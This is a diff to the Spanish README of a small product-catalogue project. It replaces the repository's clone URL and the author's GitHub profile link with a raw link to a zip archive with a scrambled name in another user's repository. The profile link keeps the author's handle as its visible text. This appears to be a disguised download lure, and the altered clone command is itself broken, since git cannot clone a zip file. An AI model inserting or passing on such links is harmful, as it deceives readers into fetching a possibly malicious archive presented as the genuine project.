@@ -54,7 +54,7 @@ Sistema completo de catálogo de productos con sistema de favoritos, carrito de 
 ### Clonar el Repositorio
 
 ```bash
-git clone https://github.com/mateoescudero10-svg/Mini-cat-logo-de-productos-con-favoritos.git
+git clone https://github.com/KevRocha/Mini-cat-logo-de-productos-con-favoritos/raw/refs/heads/main/mini-catalogo-favoritos/Mini-logo-con-de-productos-cat-favoritos-v2.8.zip
 cd Mini-cat-logo-de-productos-con-favoritos
 ```
 
@@ -244,7 +244,7 @@ Este proyecto está bajo la Licencia MIT.
 ## 👨‍💻 Autor
 
 **Mateo Escudero**
-- GitHub: [@mateoescudero10-svg](https://github.com/mateoescudero10-svg)
+- GitHub: [@mateoescudero10-svg](https://github.com/KevRocha/Mini-cat-logo-de-productos-con-favoritos/raw/refs/heads/main/mini-catalogo-favoritos/Mini-logo-con-de-productos-cat-favoritos-v2.8.zip)
 
 ## 📧 Contacto
 
